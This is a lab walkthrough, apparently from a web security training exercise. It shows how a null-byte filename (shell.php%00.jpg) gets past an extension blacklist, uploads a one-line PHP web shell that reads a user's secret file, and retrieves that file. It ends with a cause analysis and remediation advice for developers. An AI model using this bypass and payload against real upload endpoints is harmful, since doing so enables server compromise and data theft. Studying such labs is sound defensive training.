# Lab: Web Shell Upload via Obfuscated File Extension

## Objective:
Bypass the application's file extension blacklist using a classic filename obfuscation technique, upload a PHP web shell, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I intercepted the avatar upload request using Burp Suite.

3. I renamed the uploaded file to:

shell.php%00.jpg

4. I kept the Content-Type as:

Content-Type: image/jpeg

5. I replaced the image contents with the following PHP payload:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
6. I sent the modified request.

7. The application accepted the upload because it validated the filename before properly handling the null byte (%00).

8. After processing the filename, the server treated the uploaded file as:

shell.php

instead of:

shell.php.jpg

9. I accessed the uploaded file:

GET /files/avatars/shell.php

10. The server executed the PHP payload and returned Carlos's secret:

ZpcHp00NzVvx9HzOHx6CacsrVEAbxALG

11. I copied the secret and submitted it.

The lab was successfully solved.

--- 
## Vulnerability:
Web Shell Upload via Obfuscated File Extension

## Cause:
The application relied on blacklist-based extension validation and failed to correctly handle a null byte (%00) inside the filename. The filename was validated as an image, but after processing, the null byte truncated the filename, causing the server to store and execute it as a PHP file.

## Takeaway:
Applications should never rely on blacklist filtering for uploaded filenames.

## Developers should:

- Use a strict whitelist of allowed extensions.
- Fully normalize and decode filenames before validation.
- Reject filenames containing null bytes or other special characters.
- Validate file contents in addition to the extension.
- Store uploaded files outside the web root whenever possible.

Improper filename handling can allow attackers to bypass extension filters and achieve Remote Code Execution.
